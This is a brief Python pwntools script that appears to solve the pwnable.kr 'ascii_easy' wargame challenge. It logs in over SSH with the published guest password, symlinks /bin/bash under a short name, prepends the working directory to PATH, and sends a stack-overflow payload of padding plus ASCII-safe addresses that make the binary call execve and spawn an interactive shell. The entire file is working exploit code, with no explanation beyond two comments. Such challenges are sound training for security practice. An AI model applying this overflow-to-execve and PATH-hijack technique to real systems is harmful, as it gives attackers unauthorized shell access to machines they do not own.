from pwn import *
from pwnlib.tubes.ssh import ssh_process



s = ssh(user="ascii_easy",host="pwnable.kr",port=2222,password="guest")


sh = s.shell("nc 0 10021")
sh.sendline(b"ln -s /bin/bash ii")
sh.sendline(b"export PATH=\"$PWD:$PATH\"")

sh.recv(timeout=1)

call_execve = 0x5561676a
ii =0x55643769  # 1st argument : "ii"
null = 0x556f7640 # 2st argument : NULL
_argv = b'A'*32
_argv += p32(call_execve)
_argv += p32(ii)
_argv += p32(null)
_argv += p32(null)

sh.sendline(b'$PWD/ascii_easy'+ b" "+ _argv)
print(sh.recv(timeout=1).decode())

sh.interactive()

